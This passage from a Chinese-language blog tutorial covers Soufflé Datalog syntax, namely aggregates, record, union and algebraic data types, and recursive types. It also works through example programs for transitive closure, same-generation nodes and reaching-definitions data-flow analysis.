class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl equivalence(x:number, y:number)</span><br><span class="line">equivalence(a, b) :- rel1(a), rel2(b).      // every element of rel1 is equivalent to every element of rel2</span><br><span class="line"></span><br><span class="line">equivalence(a, a) :- equivalence(a, _).     // reflexivity</span><br><span class="line">equivalence(a, b) :- equivalence(b, a).     // symmetry</span><br><span class="line">equivalence(a, c) :- equivalence(a, b), equivalence(b, c).  // transitivity</span><br></pre></td></tr></table></figure><h3 id="inline">inline</h3><p>和 C 语言类似，<code>inline</code> 将会在评估的时候直接展开，而不是单独的存储数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl natural_number(x:number)</span><br><span class="line">natural_number(0).</span><br><span class="line">natural_number(x+1) :- natural_number(x), x &lt; 10000.</span><br><span class="line"></span><br><span class="line">.decl natural_pairs(x:number, y:number) inline</span><br><span class="line">natural_pairs(x,y) :- natural_number(x), natural_number(y).</span><br><span class="line"></span><br><span class="line">.decl query(x:number)</span><br><span class="line">query(x) :- natural_pairs(x,y), x &lt; 5, y &lt; x.</span><br></pre></td></tr></table></figure><p>相当于下面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl natural_number(x:number)</span><br><span class="line">natural_number(0).</span><br><span class="line">natural_number(x+1) :- natural_number(x), x &lt; 10000.</span><br><span class="line"></span><br><span class="line">.decl query(x:number)</span><br><span class="line">query(x) :- natural_number(x), natural_number(y), x &lt; 5, y &lt; x.</span><br></pre></td></tr></table></figure><p>这样子会避免计算并且存储大量的 <code>natural_pairs</code>。但是可以知道，这必然会带来一定用法上的限制，我们暂时略过。</p><h3 id="析取">析取</h3><p>一般来说，Datalog 都是采取合取，但是也支持析取的语法。也就是 yong <code>;</code> 而不是 <code>,</code> 间隔。</p><p>例如，假设对于是否能进入房子分成三类人，<code>Housemate</code> 和 <code> Owner</code> 可以进入，但是 <code>Stranger</code> 不可以。就可以得到下面的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.type Owner &lt;: symbol</span><br><span class="line">.type Housemate &lt;: symbol</span><br><span class="line">.type Building &lt;: symbol</span><br><span class="line">.type Stranger &lt;: symbol</span><br><span class="line"></span><br><span class="line">.type Human = Housemate|Owner|Stranger</span><br><span class="line"></span><br><span class="line">.decl IsHousemate(x:Housemate,y:Building)</span><br><span class="line">.decl IsOwner(x:Owner,y:Building)</span><br><span class="line">.decl IsStranger(x:Stranger,y:Building)</span><br><span class="line"></span><br><span class="line">IsHousemate(&quot;Bob&quot;,&quot;partment123&quot;).</span><br><span class="line">IsOwner(&quot;Alice&quot;,&quot;partment123&quot;).</span><br><span class="line">IsStranger(&quot;Eric&quot;,&quot;partment123&quot;).</span><br><span class="line"></span><br><span class="line">.decl accessable(x:Human,y:Building)</span><br><span class="line">.output accessable</span><br><span class="line">accessable(x,y) :- IsHousemate(x,y);IsOwner(x,y),!IsStranger(x,y).</span><br></pre></td></tr></table></figure><h2 id="算术表达式">算术表达式</h2><p>souffle 做了一定的函子拓展，支持部分内置算术表达式。例如，可以在推导时加上条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl A(n: number)</span><br><span class="line">.output A</span><br><span class="line">A(1).</span><br><span class="line">A(x+1) :- A(x), x &lt; 9.</span><br></pre></td></tr></table></figure><h3 id="算术操作">算术操作</h3><ul><li>Addition: <code>x + y</code></li><li>Subtraction: <code>x - y</code></li><li>Division: <code>x / y</code></li><li>Multiplication: <code>x * y</code></li><li>Modulo: <code>a % b</code></li><li>Power: <code>a ^ b</code></li><li>Counter: <code>autoinc()</code></li><li>Bit operations: <code>x band y</code>, <code>x bor y</code>, <code>x bxor y</code>, and <code>bnot x</code></li><li>Logical operations: <code>x land y</code>, <code>x lor y</code>, and <code>lnot x</code></li></ul><h3 id="算术比较">算术比较</h3><p>The following arithmetic constraints are allowed in Soufflé:</p><ul><li>Less than: <code>a &lt; b</code></li><li>Less than or equal to: <code>a &lt;= b</code></li><li>Equal to: <code>a = b</code></li><li>Not equal to: <code>a != b</code></li><li>Greater than or equal to: <code>a &gt;= b</code></li><li>Greater than: <code>a &gt; b</code></li></ul><h2 id="内置函子">内置函子</h2><p>比较特殊的是，<code>autonic()</code> 函子，相当于创建随机数。</p><p><strong><code>ord()</code></strong> 会生成此程序中这个 <code>symbol</code> 类型的序号，比如 <code>a</code> 的序号应该小于 <code>b</code>。</p><p>还有一些聚合函数，聚合函数的概念在数据库中应该学习过，就是一个集合中提取出来一个信息。</p><p><strong><code>cout</code></strong>: 统计满足条件的 fact 个数，基本语法是 <code>count:&#123;集合与条件&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.decl Car(name: symbol, colour:symbol)</span><br><span class="line">Car(&quot;Audi&quot;, &quot;blue&quot;).</span><br><span class="line">Car(&quot;VW&quot;, &quot;red&quot;).</span><br><span class="line">Car(&quot;BMW&quot;, &quot;blue&quot;).</span><br><span class="line"></span><br><span class="line">.decl BlueCarCount(x: number)</span><br><span class="line">BlueCarCount(c) :- c = count:&#123;Car(x,&quot;blue&quot;),ord(x)&gt;ord(&quot;Audi&quot;)&#125;.</span><br><span class="line">.output BlueCarCount</span><br></pre></td></tr></table></figure><p><strong><code>max</code></strong>: 很好理解，注意还要制定选择哪一个变量。</p><p><strong><code>min</code></strong>: 和 max 用法完全相同。</p><p><strong><code>sum</code></strong>: 也需要指定变量。</p><p>三者的用法见程序:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.decl A(n:number, w:symbol)</span><br><span class="line">A(1, &quot;a&quot;). A(10, &quot;b&quot;). A(100, &quot;c&quot;).</span><br><span class="line"></span><br><span class="line">.decl MaxA(x: number,w:symbol)</span><br><span class="line">.output MaxA</span><br><span class="line">MaxA(y, w) :- y = max x:&#123;A(x, w)&#125;.</span><br><span class="line"></span><br><span class="line">.decl MinA(x: number,w:symbol)</span><br><span class="line">.output MinA</span><br><span class="line">MinA(y, w) :- y = min x:&#123;A(x, w)&#125;.</span><br><span class="line"></span><br><span class="line">.decl Sum(s:number)</span><br><span class="line">.output Sum</span><br><span class="line">Sum(s) :- s = sum x:&#123;A(x,_)&#125;.</span><br></pre></td></tr></table></figure><p>得到的输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  exp1 souffle max-min-sum.dl -D -</span><br><span class="line">---------------</span><br><span class="line">MaxA</span><br><span class="line">x       w</span><br><span class="line">===============</span><br><span class="line">100     c</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">MinA</span><br><span class="line">x       w</span><br><span class="line">===============</span><br><span class="line">1       a</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Sum</span><br><span class="line">s</span><br><span class="line">===============</span><br><span class="line">111</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><p><strong><code>contains(string1, string2)</code></strong> : string2 是否包含 string1</p><p><strong><code>match</code></strong>: 含有通配符的匹配，但是文档里没有说明有哪些通配符，读者暂时只记住下面的例子即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.decl inputData(t:symbol)</span><br><span class="line">.decl outputData(t:symbol)</span><br><span class="line">.output outputData</span><br><span class="line">outputData(x) :- inputData(x), match(&quot;a.*&quot;,x).</span><br><span class="line">inputData(&quot;aaaa&quot;).</span><br><span class="line">inputData(&quot;abba&quot;).</span><br><span class="line">inputData(&quot;bcab&quot;).</span><br><span class="line">inputData(&quot;bdab&quot;).</span><br></pre></td></tr></table></figure><h2 id="自定义数据类型">自定义数据类型</h2><h3 id="基本语法">基本语法</h3><p>主要类似结构体，这虽然会影响性能，但是拓展了可用性。基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.type &lt;name&gt; = [ &lt;name_1&gt;: &lt;type_1&gt;, ..., &lt;name_k&gt;: &lt;type_k&gt; ]</span><br></pre></td></tr></table></figure><p>看下面的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// Pair of numbers</span><br><span class="line">.type Pair = [a:number, b:number]</span><br><span class="line"></span><br><span class="line">.decl A(p: Pair)  // declare a set of pairs</span><br><span class="line">A([1,2]).</span><br><span class="line">A([3,4]).</span><br><span class="line">A([4,5]).</span><br><span class="line"></span><br><span class="line">.output A</span><br><span class="line"></span><br><span class="line">// 扁平化</span><br><span class="line">.decl Flatten(a:number, b:number) output</span><br><span class="line">Flatten(a,b) :- A([a,b]).</span><br></pre></td></tr></table></figure><p>也可以定义<strong>类型别名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.type myNumber = number</span><br></pre></td></tr></table></figure><p>特殊地，还存在<strong>子类型</strong>，每个子类型都是原来类型地严格子集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.type EvenNumber &lt;: number</span><br><span class="line">.type OddNumber &lt;: number</span><br><span class="line">.type MultiplesOfFour &lt;: myEvenNumber</span><br></pre></td></tr></table></figure><p>为什么要存在子类型呢，因为这样可取区分不同的类型，比如 <code>EvenNumber</code> 和 <code>OddNumber</code> 就区分开了，在大型的项目中有利于减少错误。</p><p>实际的存储方式其实是通过记录 <code>p</code> 然后映射</p><p><img src="https://souffle-lang.github.io/img/record_table.png" alt="Record table example"></p><h3 id="Union-类型">Union 类型</h3><p>这类似于模式匹配，或者说 C 语言的联合体。具体语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.type &lt;ident&gt; = &lt;ident-1&gt; | &lt;ident-2&gt; | ... | &lt;ident-k&gt;</span><br></pre></td></tr></table></figure><p>例如地点可以分成多种类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.type City &lt;: symbol</span><br><span class="line">.type Town &lt;: symbol</span><br><span class="line">.type Village &lt;: symbol</span><br><span class="line">.type Place = City | Town | Village</span><br></pre></td></tr></table></figure><p>定义的时候，需要注意，所有类别都应该是同一种基础类型，比如上面的 <code>City</code>、<code>Town</code>、<code>Village</code> 都是基础类型 <code>symbol</code> 的子集。</p><p>前面提到了<strong>子类型</strong>，那么就要注意类型的默认转换规则，子类型或者同样的类型，才可以赋值，比如 B=&gt;A 中，A 中 <code>x</code> 的参数类型必须包含 A 中 <code>x</code> 的类型，才可以给 A 赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.type even = number</span><br><span class="line">.type odd = number</span><br><span class="line">.decl A(x:even)</span><br><span class="line">.decl B(x:odd)</span><br><span class="line">A(X) :- B(X).</span><br></pre></td></tr></table></figure><p>如果是这样就会报错.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.type even &lt;: number</span><br><span class="line">.type odd &lt;: number</span><br><span class="line">.decl A(x:even)</span><br><span class="line"></span><br><span class="line">.decl B(x:odd)</span><br><span class="line">.output A</span><br><span class="line">B(1). B(3).</span><br><span class="line">A(X) :- B(X).</span><br></pre></td></tr></table></figure><p><strong>类型转换</strong>，但是 <code>as(&lt;expr&gt;, &lt;new-type&gt;)</code> 可以进行类型转换。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.type even &lt;: number</span><br><span class="line">.type odd &lt;: number</span><br><span class="line">.decl A(x:even)</span><br><span class="line"></span><br><span class="line">.decl B(x:number)</span><br><span class="line">.output A</span><br><span class="line">B(1). B(3).</span><br><span class="line">A(as(X,even)) :-  B(X).</span><br></pre></td></tr></table></figure><h3 id="代数数据类型">代数数据类型</h3><p>他就更加类似模式匹配了，如果模式匹配不熟悉，可以稍微了解 Haskell，博客中也有所涉及。基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.type &lt;new-adt&gt; = &lt;branch-id&gt; &#123; &lt;name_1&gt;: &lt;type_1&gt;, ..., &lt;name_k&gt;: &lt;type_k&gt; &#125; | ...</span><br></pre></td></tr></table></figure><p>例如，不同的代数数据类型，甚至可以<strong>表示</strong>简单的数的操作，逐渐有其他语言中 <code>class</code> 类型的味道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.type T = A &#123; x: number &#125;</span><br><span class="line">        | B &#123; x: symbol &#125;</span><br><span class="line"></span><br><span class="line">.type Nat = S &#123;x : Nat&#125;</span><br><span class="line">          | Zero &#123;&#125;</span><br><span class="line"></span><br><span class="line">.type Expression = Number &#123; x : number &#125;</span><br><span class="line">                 | Variable &#123; v : symbol&#125;</span><br><span class="line">                 | Add &#123;e_1 : Expression, e_2 :Expression&#125;</span><br><span class="line">                 | Minus &#123;e_1 : Expression, e_2 : Expression&#125;</span><br><span class="line">                 | Mult &#123;e_1 : Expression, e_2 : Expression&#125;</span><br><span class="line">                 | Divide &#123;e_1 : Expression, e_2 : Expression&#125;</span><br><span class="line"></span><br><span class="line">.type Tree = Empty &#123;&#125;</span><br><span class="line">           | Node &#123;t1: Tree, val: unsigned, t2: Tree&#125;</span><br></pre></td></tr></table></figure><p>上面 使用的是 <code>Empty</code> 表示空，因为不能够出现 <code>nil</code>。</p><p>使用的时候，采用这样的格式 <code>$branch_constructor(args...)</code> 指定选择哪一个分支。每个分支的名字在整个程序的范围内，都必须不能重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.type Expression = Number &#123; x : number &#125;</span><br><span class="line">                 | Variable &#123; v : symbol&#125;</span><br><span class="line">                 | Add &#123;e_1 : Expression, e_2 :Expression&#125;</span><br><span class="line">                 | Imaginary &#123;&#125;</span><br><span class="line"></span><br><span class="line">.decl A(x:Expression)</span><br><span class="line">A($Number(10)).</span><br><span class="line">A($Add($Number(10),$Imaginary())).</span><br><span class="line">A($Add($Number(10), $Variable(&quot;x&quot;))).</span><br><span class="line">A($Number(x+1)) :- A($Number(x)), x &lt; 20.</span><br><span class="line"></span><br><span class="line">.output A</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  exp1 souffle test.dl -D -</span><br><span class="line">---------------</span><br><span class="line">A</span><br><span class="line">x</span><br><span class="line">===============</span><br><span class="line">$Number(10)</span><br><span class="line">$Add($Number(10), $Imaginary)</span><br><span class="line">$Add($Number(10), $Variable(x))</span><br><span class="line">$Number(11)</span><br><span class="line">$Number(12)</span><br><span class="line">$Number(13)</span><br><span class="line">$Number(14)</span><br><span class="line">$Number(15)</span><br><span class="line">$Number(16)</span><br><span class="line">$Number(17)</span><br><span class="line">$Number(18)</span><br><span class="line">$Number(19)</span><br><span class="line">$Number(20)</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><h3 id="递归类型">递归类型</h3><p>既然可以使用结构体了，那么就看看能不能支持递归，比如链表和二叉树可以视作是递归类型，但是由于命令式编程语言一切都可以用内存去理解，所以往往不会那么直接的视作递归类型。</p><p>例如下面的代码，核心看递归的层面，满足 L 的 fact <code>r1</code>，且 <code>r1</code> 中的 <code>x</code> 小于 30，那么就存在新的 L 的 fact <code>L([r1,x+10])</code>。这里需要注意，<code>r2</code> 可能并不是一层，可能是嵌套的 <code>IntList</code> 类型。</p><p>最后，Flatten 把每一个 IntList 中的 <code>x</code> 提取出来。上面提到了 p=&gt;Pair 的映射，所以根据编号，也是有顺序的。</p><p>特别注意， nil 类型，用于递归类型最初始的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.type IntList = [next: IntList, x: number]</span><br><span class="line">.decl L(l: IntList)</span><br><span class="line">L([nil,10]).</span><br><span class="line">L([r1,x+10]) :- L(r1), r1=[r2,x], x &lt; 30.</span><br><span class="line"></span><br><span class="line">.output  L</span><br><span class="line">.decl Flatten(x: number)</span><br><span class="line">Flatten(x) :- L([_,x]).</span><br><span class="line">.output Flatten</span><br></pre></td></tr></table></figure><p>来看结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  exp1 souffle list.dl -D -</span><br><span class="line">Warning: Variable r2 only occurs once in file list.dl at line 4</span><br><span class="line">L([r1,x+10]) :- L(r1), r1=[r2,x], x &lt; 30.</span><br><span class="line">---------------------------^--------------</span><br><span class="line">---------------</span><br><span class="line">L</span><br><span class="line">l</span><br><span class="line">===============</span><br><span class="line">[nil, 10]</span><br><span class="line">[[nil, 10], 20]</span><br><span class="line">[[[nil, 10], 20], 30]</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">Flatten</span><br><span class="line">x</span><br><span class="line">===============</span><br><span class="line">10</span><br><span class="line">20</span><br><span class="line">30</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><hr><p>更多的语法知识，可以查看官方文档的<a href="https://souffle-lang.github.io/program">语法部分</a>和<a href="https://souffle-lang.github.io/autotuning">高级主题部分</a>。笔者将会逐渐深入学习理论，然后开始进行实际智能合约的分析，后续会逐渐完善这个系列。</p><h1>应用实例</h1><h2 id="传递闭包和对称">传递闭包和对称</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(n: symbol, m: symbol)</span><br><span class="line"> /* facts of edge */</span><br><span class="line">edge(&quot;a&quot;, &quot;b&quot;).</span><br><span class="line">edge(&quot;b&quot;, &quot;c&quot;).</span><br><span class="line">edge(&quot;c&quot;, &quot;b&quot;).</span><br><span class="line">edge(&quot;c&quot;, &quot;d&quot;).</span><br><span class="line">/*relations*/</span><br><span class="line">.decl reachable (n: symbol, m: symbol)</span><br><span class="line">.output reachable // output relation reachable</span><br><span class="line">reachable(x, y):- edge(x, y). // base rule</span><br><span class="line">reachable(x, z):- edge(x, y), reachable(y, z). // inductive rule</span><br><span class="line"></span><br><span class="line">// 对称</span><br><span class="line">.decl SCC(n:symbol,m:symbol)</span><br><span class="line">.output SCC</span><br><span class="line">SCC(x,y) :- reachable(x,y), reachable(y,x).</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  exp1 souffle test.dl -D -</span><br><span class="line">---------------</span><br><span class="line">reachable</span><br><span class="line">n       m</span><br><span class="line">===============</span><br><span class="line">a       b</span><br><span class="line">a       c</span><br><span class="line">a       d</span><br><span class="line">b       b</span><br><span class="line">b       c</span><br><span class="line">b       d</span><br><span class="line">c       b</span><br><span class="line">c       c</span><br><span class="line">c       d</span><br><span class="line">===============</span><br><span class="line">---------------</span><br><span class="line">SCC</span><br><span class="line">n       m</span><br><span class="line">===============</span><br><span class="line">b       b</span><br><span class="line">b       c</span><br><span class="line">c       b</span><br><span class="line">c       c</span><br><span class="line">===============</span><br></pre></td></tr></table></figure><h2 id="寻找深度相同节点">寻找深度相同节点</h2><p>对于一颗树，寻找深度相同的节点。</p><p><img src="https://souffle-lang.github.io/img/same_generation_graph.jpg" alt="Example graph"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.decl Parent(n: symbol, m: symbol)</span><br><span class="line">Parent(&quot;d&quot;, &quot;b&quot;). Parent(&quot;e&quot;, &quot;b&quot;). Parent(&quot;f&quot;,&quot;c&quot;).</span><br><span class="line">Parent(&quot;g&quot;, &quot;c&quot;). Parent(&quot;b&quot;, &quot;a&quot;). Parent(&quot;c&quot;,&quot;a&quot;).</span><br><span class="line">.decl Person(n: symbol)</span><br><span class="line">Person(x) :- Parent(x, _).</span><br><span class="line">Person(x) :- Parent(_, x).</span><br><span class="line">.decl SameGeneration (n: symbol, m: symbol)</span><br><span class="line">SameGeneration(x, x):- Person(x).</span><br><span class="line">// 关键在于下面的逻辑推导，如果x,y是同级别的，那么它们的父节点也是同级别的</span><br><span class="line">SameGeneration(x, y):- Parent(x,p), SameGeneration(p,q), Parent(y,q).</span><br><span class="line">.output SameGeneration</span><br></pre></td></tr></table></figure><p>可以发现，推导是允许递归的。</p><h2 id="数据流分析">数据流分析</h2><p>data-flow analysis（DFA），数据流分析基于控制流图，是比较典型的用节点和图表示程序运行过程的分析方法。具体可以见博客的<a href="https://www.blog-blockchain.xyz/tags/program-language/">软件分析</a>部分。</p><p>这下面是一个可达性分析（也被叫做 liveness 分析，笔者不是很清楚其中区别），可以理解为一个带着分支的循环，d1 和 d2 都定义了变量 v，然后 B3 节点可达的变量 v 一定是在 B4 节点中的 d2。</p><p><img src="http://cdn.blog-blockchain.xyz/202210032209864.jpeg" alt="Reaching definition example"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// define control flow graph</span><br><span class="line">// via the Edge relation</span><br><span class="line">.decl Edge(n: symbol, m: symbol)</span><br><span class="line">Edge(&quot;start&quot;, &quot;b1&quot;).</span><br><span class="line">Edge(&quot;b1&quot;, &quot;b2&quot;).</span><br><span class="line">Edge(&quot;b1&quot;, &quot;b3&quot;).</span><br><span class="line">Edge(&quot;b2&quot;, &quot;b4&quot;).</span><br><span class="line">Edge(&quot;b3&quot;, &quot;b4&quot;).</span><br><span class="line">Edge(&quot;b4&quot;, &quot;b1&quot;).</span><br><span class="line">Edge(&quot;b4&quot;, &quot;end&quot;).</span><br><span class="line"></span><br><span class="line">// 重新定义变量v的节点和声明编号</span><br><span class="line">.decl GenDef(n: symbol, d:symbol)</span><br><span class="line">GenDef(&quot;b2&quot;, &quot;d1&quot;).</span><br><span class="line">GenDef(&quot;b4&quot;, &quot;d2&quot;).</span><br><span class="line"></span><br><span class="line">// 可以删除对之前的引用，比如b4节点可以删除之前的d1定义的变量v</span><br><span class="line">.decl KillDef(n: symbol, d:symbol)</span><br><span class="line">KillDef(&quot;b4&quot;, &quot;d1&quot;).</span><br><span class="line">KillDef(&quot;b2&quot;, &quot;d2&quot;).</span><br><span class="line"></span><br><span class="line">// Reachable</span><br><span class="line">.decl Reachable(n: symbol, d:symbol)</span><br><span class="line">Reachable(u,d) :- GenDef(u,d). // 定义变量的节点必然是可达的</span><br><span class="line">// 当存在节点 u 可以到达v，而且u也是可到达v的，u不会覆盖或者删除对定义d的引用</span><br><span class="line">Reachable(v,d) :- Edge(u,v), Reachable(u,d), !KillDef(u,d).</span><br><span class="line"></span><br><span class="line">.output Reachable</span><br></pre></td></tr></table></figure><p>这样，就清楚在每一个节点，某一个变量来自于哪一个定义了。这里必须补充一下，变量并不是和变量名绑定，而是说对应的内存中的对象，如果修改了内存，就是新的对象了，也可以称作是定义。可达性分析可以知道当前语句中的某个变量，来自于哪一个定义的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 